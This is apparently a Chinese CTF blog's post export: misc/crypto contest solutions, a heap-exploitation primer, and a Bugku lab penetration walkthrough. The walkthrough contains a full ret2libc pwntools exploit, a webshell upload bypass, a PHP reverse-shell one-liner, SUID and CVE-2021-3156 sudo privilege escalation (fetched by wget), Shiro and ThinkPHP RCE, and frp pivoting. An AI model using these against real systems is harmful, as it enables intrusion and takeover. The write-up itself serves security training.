LibcSearcher('puts',puts_addr)\n  \n  \nlibc = ELF('libc-2.31.so')\n  \n  \nlibcbase = puts_addr - libc.symbols['puts']\n#libcbase = puts_addr - libc.dump('puts')\n  \nsystem = libcbase + libc.symbols['system']\n#system = libcbase + libc.dump('system')\n  \np.sendafter('content:\\n',p64(system))\n  \n  \np.interactive()\n  \n```\n\n![](http://cdn.anyiblog.top/common/1664068262508-f63445f5-849f-48e5-9e8c-4c37601b9335.jpg)  \nlibc方面需要注意下。","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"2022第六届强网杯青少赛 Misc&Crypto-WriteUp","url":"/2022/09/12/20220912/","content":"\n# 题外话\n\n最近好久没更新博客了，来水一篇文章，另外之前使用安恒的图床导致很多图片显示不出来，所以现在换用github的图床，图片会正常显示的就是可能加载速度较慢，解决了之前的老毛病。\n\n我自己都觉得博客体验感差，有点卡 但是没办法希望大家能等等，等到我成年以后可以备案之后这些问题都是小问题。\n\n# 前言\n\n前天参加了强网的青少赛，有幸拿到了线下名额，现在对misc和crypto的题目进行巩固复盘下，有一说一今年的题目还是挺友好的。\n\n另外个人觉得misc出的有点水了 两道题目有同样的考点 质量不是很好。\n\n比较可惜的就是没拿到前三血，misc都是比较靠前做出来。\n\n题目附件：\n- misc1:https://share.weiyun.com/wxckLdqd\n- misc3:https://share.weiyun.com/CaRkgF5v\n- crypto1:https://share.weiyun.com/UnB1MJxI\n- crypto2:https://share.weiyun.com/YMmjelND\n\n# 题解\n\n### Misc1\n\n下载附件得到chuyinweilai.png winhex分析\n\n![](http://cdn.anyiblog.top/common/20220912200419.png)\n\n发现里面的数据是base64，用脚本解密下写到新的文件\n\n    import base64\n    f = open('chuyinweilai.png','r')\n    content = base64.b64decode(f.read())\n    with open('new.png','wb') as f:\n    f.write(content)\n\n\n![](http://cdn.anyiblog.top/common/20220912200458.png)\n\n输出后的图片仍然不显示\n\n![](http://cdn.anyiblog.top/common/20220912200608.png)\n\n用winhex分析发现奇数位的字节和偶数位的字节相反了，起初我以为只是出题人对图片的头和尾进行了修改，当我修改头和尾后发现仍然不显示，那么就说明每一个字节都是相反的。\n\n![](http://cdn.anyiblog.top/common/20220912200813.png)\n\n使用脚本修改\n\n    import base64\n    import binascii\n    f = open('chuyinweilai.png','r')\n    content = base64.b64decode(f.read())\n    r = \"\"\n    for i in range(0,len(content),2): #分奇偶写入文件\n        r += str(hex(content[i+1]))[2:].zfill(2) #这里zfill(2)很重要 一定要填充0 否则结果大相径庭\n        r += str(hex(content[i]))[2:].zfill(2)\n    content = binascii.unhexlify(r)\n    with open('new.png','wb') as f:\n    f.write(content)\n\n\n![](http://cdn.anyiblog.top/common/20220912200830.png)\n\n运行脚本，输出的图片成功显示：\n\n![](http://cdn.anyiblog.top/common/20220912200850.png)\n\n图片提示音乐的财富密码，我们百度一下发现是数字4536251\n\n![](http://cdn.anyiblog.top/common/20220912200912.png)\n\n这一猜就知道是某种加密的图片隐写，但还不知道是哪种所以刚开始一直试都错了导致做题的进度变慢了，后面我stegsolve分析了一下发现lsb头部有数据，同时又存在加密，根据经验就知道是cloack-pixel加密。\n\n使用payload得到flag\n\n![](http://cdn.anyiblog.top/common/20220912201051.png)\n\n![](http://cdn.anyiblog.top/common/20220912201057.png)\n\n做这种题目还得是多做才能提高速度，有经验就能做快很多。\n\nflag{5cc0aa21208b517dbd0bde650247237f}\n\n### Misc3\n\n下载附件得到png图片，winhex分析 直接拖到尾部发现PK头和一个密码7his_1s_p4s5w0rd\n\n![](http://cdn.anyiblog.top/common/20220912201431.png)\n\n改后缀为.zip 发现文件没有密码 给的是一张png图片，那么说明这个密码同样和第一题一样是图片隐写的密码\n\n![](http://cdn.anyiblog.top/common/20220912201501.png)\n\n再次cloack-pixel尝试 结果一下就出了flag（吐槽下出题人真的很爱用cloack-pixel 同时也是我为什么说题目质量不好的原因）\n\n![](http://cdn.anyiblog.top/common/20220912201530.png)\n\n![](http://cdn.anyiblog.top/common/20220912201535.png)\n\nflag{2e55f884-ef01-4654-87b1-cc3111800085}\n\n### Crypto1\n\n题目给了一个txt文件 里面是许多的A和B\n\n![](http://cdn.anyiblog.top/common/20220912201613.png)\n\n刚开始猜测是培根密码，但结果不是，后来想到A和B如同0和1 还有摩斯密码\n尝试摩斯密码，用脚本将A和B替换为.和-\n\n![](http://cdn.anyiblog.top/common/20220912201646.png)\n\nCyberchef解密一下：\n\n![](http://cdn.anyiblog.top/common/20220912201659.png)\n\n这个明文看上去像是一个被打乱的明文，以某种规律打乱的替换密码 尝试使用https://quipqiup.com/ 网站进行分析(很多看不懂的密文尝试丢里面会有惊喜)\n\n![](http://cdn.anyiblog.top/common/20220912201752.png)\n\n得到了flag，但这里还不对 这里是一个坑点，当时尝试了很久。同时注意这里的flag的字母要变成小写。\n\n因为摩斯电码存在两种情况，也可以是前者为-后者为. 所以正确解法是A和B替换相反一下，反过来再试就得到了flag\n\n![](http://cdn.anyiblog.top/common/20220912201910.png)\n\nflag{1d817f23-4e20-9405-bf6d-e83d055316d6}\n\n### Crypto2\n\n下载附件得到密文FvLFArGp[ovpxBpsssD]qCElwwoClsoColwpuvlqFv\n\n![](http://cdn.anyiblog.top/common/20220912202011.png)\n\n这个密文刚开始第一眼可以隔一位看有F L A G [ xxxxxxxxx] xxxxxx 有点像栅栏密码所以就去在线网站尝试\n\n网站尝试一番过后 当栅栏数为32时最终结果格式为flag{} 得到栅栏数为32\n\n![](http://cdn.anyiblog.top/common/20220912202132.png)\n\n题目提示说最终结果为flag{uuid}\n\n所以先把这段字符串转换为小写 这里直接异或32位就都转换成对应的大小写，同时[变为{\n\n![](http://cdn.anyiblog.top/common/20220912202218.png)\n\nFlag很接近了，我们再去了解一下uuid  uuid一般为8-4-4-16 共36位长，且有-\n\n所以这里我们只要把每8位后一位的字母\"L\" 的ascii(76) 减去 符号\"-\"的ascii(45)就是每个字符串需要减去的差值\n\nOrd(‘L’) – ord(‘-‘) = 31\n\n开写脚本，讲密文的每一位ascii都减去31 再转换结果\n\n![](http://cdn.anyiblog.top/common/20220912202355.png)\n\n这里我当时以为就是flag了，卡了很久，这里也是一个坑 个人觉得有点不妥的地方\n\n因为uuid都是16进制，那么哪里来的大写的G呢？\n\n所以当时猜测了一下，G与F仅差1位，即ascii -32就是F(原来的是ascii -31)，同时看原密文f对应G，有没有可能是小写字母要减去32位 而大写字母只用减去31位呢\n\n写脚本验证（最终脚本）：\n\n    cryher = \"FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]\"\n    res = \"\"\n    for i in cryher:\n        res += chr(ord(i)^32)\n    \n    content = \"VXPSdQceLWWOcLSOcOLWPUVLQfVVfRPOPbSS\"\n    res = \"flag{\"\n    for i in content:\n        if i.isupper(): #大写 -31\n            res += chr(ord(i)-31)\n        else: #小写 -32\n            res += chr(ord(i)-32)\n    res += \"}\"\n    print(res.lower())\n\n\n![](http://cdn.anyiblog.top/common/20220912202529.png)\n\n这个flag看起来有点样子了，都是符合要求的16进制 事实上就是最终的flag。\n\n需要注意的是最终flag值要为小写\n\nflag{7914d2ce-880c-40c0-8167-2f77f3101b44}\n","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"Bugku渗透测试1 writeup超详细","url":"/2022/08/03/20220803/","content":"Bugku的新模式渗透题~\n  \n![](http://cdn.anyiblog.top/common/1659459257141-6080bbd3-fc8c-4790-a5a4-0c4e8f2f8b76.jpg)  \n给了一个网页IP，先nmap扫描下看看有什么服务\n  \n![](http://cdn.anyiblog.top/common/1659459258192-ac2a6dae-6e5f-4fc7-a234-2c9b51a085ab.jpg)  \n开了22/80/8080/9999 这些端口后面会用到，我们先看web服务。\n  \n# 场景1：\n  \n访问web主页\n  \n![](http://cdn.anyiblog.top/common/1659459258996-14118064-cbc4-4b2d-a281-d4fd3c5805d3.jpg)  \n  \n查看源代码得到FLAG\n  \n![](http://cdn.anyiblog.top/common/1659459259447-4571f2e2-8a92-4160-bc34-4ef0fd5b0b2c.jpg)  \nFlag1：flag{8888342c9289af87d7fcd8678a7a386c}\n  \n给的提示要我们去后台，猜测/admin\n  \n# 场景2：\n  \n访问后台/admin\n  \n[http://47.122.10.163/admin-login-index.html](http://47.122.10.163/admin-login-index.html)\n  \n![](http://cdn.anyiblog.top/common/1659459259882-732f7656-80c2-4c99-a2f6-677c5b4b4026.jpg)  \n猜测弱口令admin,admin 登陆成功\n  \n在后台找到flag\n  \n![](http://cdn.anyiblog.top/common/1659459260410-36d80f33-f002-4281-9433-85f9fff2cf76.jpg)  \nFlag2：flag{53f9889845ef3b46a84d8e934fca2c79}\n  \n且给的提示flag在/home 意思就是要我们getshell进后台\n  \n# 场景3：\n  \n在后台查找功能，发现有文件上传，且可以设置上传后缀。\n  \n![](http://cdn.anyiblog.top/common/1659459260828-4f947c69-cffd-4b38-b485-ff1ad195ea63.jpg)  \n因此我们添加php\n  \n然后我们在 “上传图标”处上传一句话木马，经过测试其它上传点不受这个后缀影响，我们进行上传渗透。\n  \n![](http://cdn.anyiblog.top/common/1659459261225-500a5b38-e672-4b60-8ef3-29cf775abb6c.jpg)  \n  \n  \n直接上传php试试\n  \n![](http://cdn.anyiblog.top/common/1659459261612-98afade0-9098-48d1-8ce7-59c9fb785aa4.jpg)  \n  \n返回上传后缀为空，因此我们可以猜测后台检测到php后缀会替换为空，所以会这样回显\n  \n那么，只要我们双写后缀即可绕过。.pphphp\n  \n使用burpsuite进行拦包\n  \n![](http://cdn.anyiblog.top/common/1659459262066-d261687e-c7b0-4aca-ad2c-ac7905495136.jpg)  \n后缀修改为双写后，我们得到返回的木马路径\n  \n/data/uploads/2022\\_08\\_02\\_420cd674c5d82b50133562842024f595.php\n  \n蚁剑直接连接即可。\n  \n![](http://cdn.anyiblog.top/common/1659459262699-73c6cd8e-f027-4c4f-9028-fa5b2e5e53ac.jpg)  \n成功连接，我们直接查看/home里的文件\n  \n![](http://cdn.anyiblog.top/common/1659459263131-2254fe79-a316-4284-8f2e-d8a61ed852c4.jpg)  \nFlag3：flag{42c2d7db706f095d9875a5ebbb597235}\n  \n给出提示在数据库里\n  \n# 场景4：\n  \n我们还需要知道root的账号密码，一般网页文件会连接数据库，因此只要我们找到其配置文件config.php即可知道账号密码\n  \n![](http://cdn.anyiblog.top/common/1659459263522-70894157-cb38-436d-bd71-8d8374290ffb.jpg)  \n得到账号密码root;root\n  \n但是啊，这里我们远程连接靶机会发现mysql是没开的\n  \n甚至在靶机里也是不能用mysql的\n  \n这里我是用mysqldump dump出数据库的，因为一般数据库里的flag表名都叫flag\n  \nmysqldump -uroot -proot flag > flag.sql\n  \n所以在蚁剑的虚拟终端这里用\n  \n![](http://cdn.anyiblog.top/common/1659459263874-1575ecaa-a4fb-48de-9661-db4212748c5f.jpg)  \n找到文件\n  \n![](http://cdn.anyiblog.top/common/1659459264386-43714f35-5812-4545-97c4-5a6d6c43ce2f.jpg)  \nFlag4：flag{a39a07afd472f580deb6279e7db378dc}\n  \n根据提示nc，结合nmap扫描到的端口 猜测是nc 9999端口 得到root权限的shell\n  \n# 场景5：\n  \npwn的文件在/home/ctf里的main文件\n  \n![](http://cdn.anyiblog.top/common/1659459264858-58382f4e-87cb-4144-9133-f14ca315ef74.jpg)  \n我们下载到本地分析 \n  \n32位pwn\n  \n![](http://cdn.anyiblog.top/common/1659459265339-349a0722-ab90-4070-8932-4593178bbfe1.jpg)  \n![](http://cdn.anyiblog.top/common/1659459265822-7eebe18c-ca4e-4f28-ae61-e31e41c9f8b8.jpg)  \nread这里存在栈溢出，题目没给system和后门地址，需要我们ret2libc\n  \n这里用ROPgadger看一下pop esi;edi;ebp;ret\n  \n![](http://cdn.anyiblog.top/common/1659459266274-48c3be55-5ab1-4bfa-8a25-b22a66d14eed.jpg)  \nEXP:\n  \n```\nfrom pwn import *\n  \nfrom LibcSearcher import *\n  \ncontext.log_level = 'debug'\n  \n  \nr = remote('47.122.10.163',9999)\n  \n  \nelf = ELF('./main')\n  \n  \nmain_addr = elf.sym['main']\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\n  \n  \nprint(write_got)\n  \n  \nppp_ret = 0x08048559\n  \n  \npayload = b'A'*(0x24 + 4) + p32(write_plt) + p32(ppp_ret) + p32(1) + p32(write_got) + p32(8) + p32(main_addr)\n  \n  \nr.sendlineafter('plz input your name:\\n',payload)\n  \n  \nwrite_addr = u32(r.recv(4))\n  \n  \nprint(hex(write_addr))\n  \n  \nlibc = LibcSearcher('write',write_addr)\n  \n  \nlibc_base = write_addr - libc.dump('write')\n  \n  \nsystem_addr = libc_base + libc.dump('system')\n  \n  \nbinsh_addr = libc_base + libc.dump('str_bin_sh')\n  \n  \nprint(hex(system_addr),hex(binsh_addr))\n  \n  \npayload = b'A'*40 +p32(system_addr) + b'a'*4 + p32(binsh_addr)\n  \n  \nr.sendlineafter('plz input your name:\\n',payload)\n  \n  \nr.interactive()\n  \n```\n  \n  \n运行后libc选择第3个\n  \n![](http://cdn.anyiblog.top/common/1659459266931-114987d7-9906-4a01-b68e-d1158395ce17.jpg)  \n拿到shell\n  \n![](http://cdn.anyiblog.top/common/1659459267363-a24dbca7-b571-494c-bf33-6c5f761e2833.jpg)  \nFlag5：flag{86bc02275ce7a4d8fb7e17c7e6e4ac98}\n  \n给出提示8080端口，因此我们待会对8080端口进行渗透\n  \n# 场景6：\n  \n![](http://cdn.anyiblog.top/common/1659459267908-4d37fc79-00d7-4e16-8b98-eb123fdb830c.jpg)  \n我们拿到web题先试试一些敏感路径，比如robots.txt\n  \n访问得到FLAG\n  \n![](http://cdn.anyiblog.top/common/1659459268304-d3459927-4b15-4e2c-ad67-727bfa08c604.jpg)Flag6： flag{f87597c33d7af97cf2872e373fa7db7f}    \n  \n结合提示说flag在/home，因此接下来又需要我们RCE了\n  \n# 场景7：\n  \n![](http://cdn.anyiblog.top/common/1659459268728-75bff101-5242-4ce6-ad21-beb92b010c65.jpg)  \n看到这个remember me直接可以去试试shiro的漏洞了\n  \n先拦包看看回显有没有delete me\n  \n![](http://cdn.anyiblog.top/common/1659459269197-7a2a8d13-7be3-4fb6-8113-92f323f313f8.jpg)  \n存在漏洞\n  \n这里我们直接用飞鸿师傅的poc工具\n  \n![](http://cdn.anyiblog.top/common/1659459269656-783aea68-c6dc-48c6-b1e6-881ed6d92e9d.jpg)  \n成功RCE\n  \n这里最好有一个公网VPS，我是用自己阿里云的服务器\n  \n然后挂起一个端口进行反弹shell回来\n  \n![](http://cdn.anyiblog.top/common/1659459270109-57014e73-fe6a-492d-b810-cdf68ff09d00.jpg)  \n（这里不稳定命令和反弹shell需要多试几次的）\n  \n拿到shell\n  \n![](http://cdn.anyiblog.top/common/1659459270493-138cb747-127f-4580-be4b-bc26cd89038f.jpg)  \nflag在/home cat一下\n  \n![](http://cdn.anyiblog.top/common/1659459270863-d0cf7915-8c6a-462a-a8b2-cf853e9fe51e.jpg)  \nFlag7：flag{a7081082e1474c72f83b4d84c99b9f62}\n  \n这里没给提示，我们猜测是要提权去root里面找flag。\n  \n# 场景8：\n  \n我们用户没有权限，需要提权才行。\n  \n因此root提权，可以想到用suid提权\n  \n```\nfind / -perm -4000 -type f 2>/dev/null #查看具有suid 权限的可执行二进制程序\n```\n  \n  \n![](http://cdn.anyiblog.top/common/1659459271196-6348f25b-828e-4940-9927-d35c1da20acc.jpg)  \n结果里有find，那么直接用find提权即可\n  \n大致操作就是去一个有权限的文件夹（如/tmp）创建一个file，然后find file -exec whoami \\\\;即可拿到root权限\n  \n![](http://cdn.anyiblog.top/common/1659459271531-1d08ba9c-07b8-48df-84bf-7e57f05c5332.jpg)  \n拿到root权限，直接查看root里的flag\n  \n![](http://cdn.anyiblog.top/common/1659459271865-fc513b87-f63e-4067-97b4-dea499981fdf.jpg)  \nFlag8：flag{cd2c2f3e6ff29233d78afe3b628f2daa}\n  \n这里给的提示是内网渗透了，要我们找内网里的靶机。\n  \n（这里没vps做题真的挺困难的）\n  \n# 场景9：\n  \n我们关注下这几个靶机的ip，刚刚拿到shell的这台靶机没有ifconfig。。\n  \n![](http://cdn.anyiblog.top/common/1659459272143-302a1d73-fe78-403b-ab5a-5bade17c8724.jpg)  \n使用我们之前蚁剑打进去的webshell看\n  \n![](http://cdn.anyiblog.top/common/1659459272528-d2b6fb02-0a2b-4d92-b727-d374fba66ff5.jpg)  \n得到IP 192.168.0.2\n  \n我们用nmap进行网段扫描一波 \n  \n（因为webshell执行的大多命令不会有回显，所以我们输出到一个文件里）\n  \nnmap -sT -n 192.168.0.0/24 > res.txt\n  \n![](http://cdn.anyiblog.top/common/1659459272877-f4c14530-ce57-4a93-ad07-65518e141a4c.jpg)  \n得到这4个ip，1-3我们都探测到了，因此我们需要渗透192.168.0.4这个IP\n  \n服务有80端口和3306。\n  \n那么这里衍生的另一个问题来了，我们该如何在外网进行内网渗透，访问这个80端口的网页\n  \n我们需要一个代理。\n  \n使用frp进行内网穿透，将内网的ip的某个端口映射到我们公网ip的端口，我们再去访问公网的ip即可实现访问内网网站\n  \n搭建比较简单，可以去网上找下资料，这里就不详讲了，主要讲一下如何映射端口\n  \n以下服务端是我们公网的ip，客户端是内网靶机。\n  \n服务端：\n  \nfrps.ini\n  \n![](http://cdn.anyiblog.top/common/1659459273183-2f257560-f15f-4a96-b6b4-15b6ae672dd1.jpg)  \nbind\\_addr设置我们自己的ip，\nbind\\_port设置的端口待会要和客户端一致，\ntoken相当于连接密码\n  \n需要注意如果你也是阿里云或者别的服务器，设置的端口要设置好防火墙过滤，否则就会失效。\n  \n客户端：\n  \nfrpc.ini\n  \n![](http://cdn.anyiblog.top/common/1659459273579-e5c4fa6d-cdb2-4f8e-a8e7-c509d5ba10bf.jpg)  \nserver\\_addr设置我们公网的ip\nserver\\_port设置好你服务端设的端口\ntoken就设置你的连接密码\n  \nlocal\\_ip就是你要映射的IP\nlocal\\_Port映射IP的端口\nremote\\_port映射到公网的哪个端口\n  \n这里也要记得开一下防火墙过滤端口\n  \n  \n两个都设置好后，服务端输入./frps -c frps.ini\n  \n客户端输入./frpc -c frpc.ini\n  \n成功映射端口\n  \n![](http://cdn.anyiblog.top/common/1659459273963-2ea21ef4-13cb-498c-9ea4-bc40b20e65fd.jpg)  \n这时候只要我们访问公网的7777端口就是在访问内网ip192.168.0.4的80端口\n  \n![](http://cdn.anyiblog.top/common/1659459276141-da7142b1-aa6d-4c0a-8b27-17bdcc39fbbc.jpg)  \n成功访问。\n  \n进行网页我们进行渗透，先试试/admin后台的弱口令。经测试无果。\n  \n然后我们访问一个报错的路径，发现这是thinkphp\n  \n![](http://cdn.anyiblog.top/common/1659459276693-217672d7-1d11-4ab2-9733-be0dda2264ff.jpg)  \n在底部发现版本号v5.0.20\n  \n![](http://cdn.anyiblog.top/common/1659459277031-4d657c6b-4ad9-4e36-816f-462b486422ea.jpg)  \n这个版本存在漏洞，我是直接拿网上的pythonPOC进行使用\n  \n![](http://cdn.anyiblog.top/common/1659459277340-5526da33-969c-4b73-bb44-34f0949f6051.jpg)  \n可以看到能RCE了。我们最好是反弹一个shell回来\n  \n这里试了很久，使用bash&nc&python都无效\n  \n后来脑洞一转想到了php，既然使用php写的那么肯定有php服务，使用php反弹shell一句话：\n  \nphp -r '$sock=fsockopen(ip,8888);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n  \n同时公网ip挂起端口\n  \n成功弹回shell\n  \n![](http://cdn.anyiblog.top/common/1659459277688-186641da-267a-4159-a170-6b4b7e0e8b15.jpg)  \n  \n在/var/www/html根目录下发现flag\n  \n![](http://cdn.anyiblog.top/common/1659459278074-acd6e2df-89e1-4dbd-8f51-a1aad517a2cf.jpg)  \nFlag9： flag{a62322c1ab634d445a586be44815803d}\n  \n给出提示database，数据库3306端口\n  \n# 场景10：\n  \n给的提示是数据库，那么我们只要把frp的端口改成3306即可，但我们还需要知道数据库账号密码\n  \n同样，我们在网站找配置文件\n  \n在/application/database.php找到账号密码aman,aman123\n  \n![](http://cdn.anyiblog.top/common/1659459278464-f892e456-a7c9-41b1-af82-be530daba742.jpg)  \n接下来我们改一下端口即可。\n  \n![](http://cdn.anyiblog.top/common/1659459278873-b1ebf56d-d59a-4935-927b-ba8af23abcbf.jpg)  \n我们mysql连接下即可\n  \n![](http://cdn.anyiblog.top/common/1659459279248-ea99784e-b46e-4186-b62f-5a90fc2572b7.jpg)  \n成功连接，之后找flag即可。\n  \n![](http://cdn.anyiblog.top/common/1659459279808-812df8bf-1339-41c7-834d-30f526d80fe5.jpg)  \nFlag10：flag{9f131e70c9c2cab880980a8fb2b3dafa}\n  \n得到提示root，应该是又要我们提权了\n# 场景11：\n  \n这里尝试了很久，之前的find提权无效，且suid的东西大多都无用\n  \n![](http://cdn.anyiblog.top/common/1659459280189-910aff05-b45f-430a-a4f2-6dc311564ae3.jpg)  \n且因为是webshell的原因，sudo还用不了\n  \n这里用的是CVE-2021-3156\n  \n先cd /tmp\n  \n下载Exp利用代码    wget [https://haxx.in/CVE-2021-3156\\_nss\\_poc\\_ubuntu.tar.gz](https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz)\n解压    tar -xvzf CVE-2021-3156\\_nss\\_poc\\_ubuntu.tar.gz\ncd CVE-2021-3156/\n编译执行    make &&./sudo-hax-me-a-sandwich 0，利用成功\n查看用户信息    id，root用户\n  \n![](http://cdn.anyiblog.top/common/1659459280625-ac875984-f3e0-4e8a-89c0-439bbc07ed05.jpg)  \n提权成功！最后查看root里的flag即可。\n  \n![](http://cdn.anyiblog.top/common/1659459280987-f1bf8b14-f7ee-4f68-8a35-a9c56a9a3390.jpg)  \nFlag11：flag{48481200756f8d75f20248e4429fd51e}","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"CTF pwn 中最通俗易懂的堆入坑指南","url":"/2022/06/07/20220607/","content":"\n> (转载自文章： [https://www.anquanke.com/post/id/163971](https://www.anquanke.com/post/id/163971))\n\n前言\n--\n\n前段时间入门了 pwn ，慢慢掌握了一些栈上的一些攻击技巧，但是发现在比赛中堆的利用才是王道…无奈只能在堆上再花些功夫。但是发现入门堆不是一件容易的事，毕竟涉及到了内存管理的知识，比较复杂。所以笔者看了大量文章和接受了大牛的指点，决定对堆中的一些基本概念进行总结，还恳请师傅们斧正~\n\n这里不会讲太多的原理性（函数源码的实现等等）的东西，尽量以最简单的形式再结合一下小例子来揭开堆和内存管理的神秘面纱。\n\n什么是堆？\n-----\n\n首先先明确一下堆的概念，堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。\n\n*   windows 和 [linux](https://www.codercto.com/topics/18170.html) 下的堆分配、管理方式都不同， **这里主要讲到的是 CTF 中常出现的 linux 下的堆分配知识**\n    \n\n先看看堆在虚拟内存中的位置\n\n![](http://cdn.anyiblog.top/common/1654602217607-9b47043f-81fb-48e6-a7e6-265519122d51.jpg)\n\n*   **堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的。**\n    \n\n实际上堆可以申请到的内存空间比栈要大很多，在 linux 的 4G 的虚拟内存空间里最高可以达到 2.9 G 的空间\n\n> 对堆操作的 是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核 。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能\n\n下面的分析都是以 **glibc 库下的 ptmalloc2 堆管理器** 来讲解的。\n\n堆的基本结构\n------\n\n先简单的画一个图吧：\n\n![](http://cdn.anyiblog.top/common/1654602218290-82fe5f32-e3a0-49c5-ba9f-812525505ce3.jpg)\n\n1.pre size 字段。 **只有在前面一个堆块是空闲的时候才有指** ，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0\n\n2.size 字段。是用来指示当前堆块的大小的（头部加上 user data 的大小）。但是这个字段的最后三位相当于三个 flag ，有另外的作用。\n\n这三位的作用分别是：\n\n> 1.NON_MAIN_ARENA     这个堆块是否位于主线程\n> 2.IS_MAPPED          记录当前 **chunk**是否是由 **mmap**分配的\n> 3.PREV_INUSE         记录前一个 **chunk**块是否被分配\n\n![](http://cdn.anyiblog.top/common/1654602218626-14bbe9ff-23a8-4add-a9a1-8f82c5167813.jpg)\n\n这里重点讲解最后一位： **用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1** ，所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节。\n\n*   所以前一个堆块的释放与否都和这两个字段（pre\\_size、size）的值有关，这是因为便于内存的释放操作（free）\n    \n    4.user data 顾名思义就是用来存放用户数据的。\n    \n\n使用 malloc 函数分配到的内存的返回值指针是 **指向 user data （用户数据区）** ，在后面的例子中也会讲到这个问题。\n\n**例如在 64 位程序中：**\n\n> malloc(8)\n\n申请到的堆块总大小为 16 + 8 + 8 + 1 = 0x21\n\n1.第一个 16 字节是 **系统最小分配的内存** ，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。\n\n*   在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节\n    \n*   例如，如果代码中是 malloc(0) 的话， **堆管理器也会分配最小内存空间给你**\n    \n\n2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）\n\n3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）\n\n4.最后一个 1 字节是 **PREV\\_INUSE 的值，只有 0 或 1两个值**\n\n说了这么多的理论肯定会有点头大，不过没关系。在后面会有实例讲解，动手调试的时候对照着每一个字段分析就会好点。\n\n指针与地址\n-----\n\n指针这一块知识在 c 语言里学的不太好的，可以在学习堆的过程中慢慢巩固一下知识。\n\n*   熟练掌握指针的使用在堆的题目分析中还是很有帮助的。下面简单说一下堆分配中的指针会用到了地方。\n    \n\n首先要明确用户在调用 malloc 函数时返回的值为 **一个指针，指向分配到堆空间（用户数据区）** ，这个在最前面的那个图片也已经标出来了。\n\n有时候题目是以更复杂的情况，用指针来表示某个数据结构的，例如下面的这个图中的例子：\n\n![](http://cdn.anyiblog.top/common/1654602218994-3eec2e7c-0696-4f61-96e8-eed40b638e1b.jpg)\nfirst chunk（second chunk）表示第一和第二个结构， **每个结构中都有一个 point\\_heap 指针来指向存储用户数据的堆块（chunk）。**\n\n**左边的这个本身就是一个堆块，用来存放一些全局信息。**比如 max\\_size 存储了能够存储的最大结构数量；exist\\_num 表示已经存储的结构的数量。\n\n### IDA 中常见的指针表示形式\n\n在 IDA 伪代码中的指针形式形如下面的情况：\n\n> *(qword_6020A8 + 8)\n\n**表示取到 qword\\_6020A8 这个地址加 8 偏移的那个地址存储的值**\n\n汇编代码等同于：\n\n\n> .text:0000000000400F85 mov rax, cs:qword\\_6020A8\n> .text:0000000000400F8C mov rax, \\[rax+8\\]\n\n\n简单转化一下，也就是：\n\n> *(addr) = [addr]\n\n### 链表\n\n在 pwn 的堆题目中，经常会有像一些”笔记管理系统”之类的题目，例如下面这里例子\n\n![](http://cdn.anyiblog.top/common/1654602219286-bd9f94f9-5c4a-4b4a-b30e-1c3dea2367f6.jpg)\n\n代码提供了最基本的增删查改的功能。这个”笔记”的数据结构 **通常就是使用链表连接起来的** ，记录了当前 note 的大小、属性、内容等等。\n\n**例如，下面这个例子就是以指针为基础来存储这个 note 结构的**。这里的 i 代表 note 的索引，若这里的 i = 0 时：\n\n![](http://cdn.anyiblog.top/common/1654602219539-76485745-0005-47eb-96ed-636d9c268caa.jpg)\n(qword\\_6020A8 + 16) 就 \\*代表从 qword\\_6020A8 这个地址出再往后偏移 16 个字节，取到这个地址存储的值，接着把 1 赋值给这个地方（也就是把 1 存入这个地址）\n\n同样的 \\*(qword\\_6020A8 + 24) 就代表偏移 24 个字节处的值为 len\n\n依次类推就可以在 **不连续的内存空间中** ，把整个 note 的数据结构存储下来了。\n\n申请堆块的本质\n-------\n\n> 堆管理器 ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。\n\nptmalloc2 的作用通俗的讲就是 **相当于一个”中间商”** ，在程序想要申请向系统申请堆空间时，这里的 ptmalloc2 就会申请一块很大的空间，并根据算法从这些内存中把空间真正的分配给程序。\n\n简单点说就是下面这个图中的情况：\n\n![](http://cdn.anyiblog.top/common/1654602219873-7b9be43c-3c86-410a-9ef7-b0ae8754b793.jpg)\n这里的举一个最简单的例子：\n\n```\n#include <stdlib.h>\n#include <malloc.h>\n\n\nint main(){\n\n\t\tchar *p;\n\t\tp = malloc(10);\n\t\t  \n\n\t\treturn 0;\n}\n```\n\n在 gdb 中进行调试，在 call malloc 处下一个断点， **在这里使用 vmmap 命令，查看内存分布** 。可以看到此时并没有发现堆段\n\n![](http://cdn.anyiblog.top/common/1654602220297-b78e52df-76bc-4b5a-ade9-546efe6fde11.jpg)\n单步 n ，vmmap 命令再次查看内存，发现出现了堆段\n\n![](http://cdn.anyiblog.top/common/1654602220764-2ee7c199-dda8-40f7-b89a-4bbf3ecbbf92.jpg)\n但是这里我们明明只是申请了 10 字节的大小，但是为什么这里的为什么给了这么大的堆段呢？\n\n> 0x00602000 ~ 0x00623000\n\n计算一下，刚好是 132 kB\n\n> (0x00623000-0x00602000)/1024 = 132 kB\n\n> 原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以这个区域叫做 main arena\n\n也就是说这 132 KB 是”厂家”（内核）批发给”中间商”（ptmalloc2）的货物， **以便下次程序在向系统申请小内存的时候，直接去”中间商”去取就行了** ，他就会在这 132KB 中按照要申请”货物”的多少进行分配下去。若”中间商”缺货了话，ptmalloc2 就继续去找”厂家”（系统内核）去取货\n\n### 查看已分配的堆内存分布\n\n在上面我们动态调试的时候已经执行了 malloc 函数，申请到的堆指针是保存在 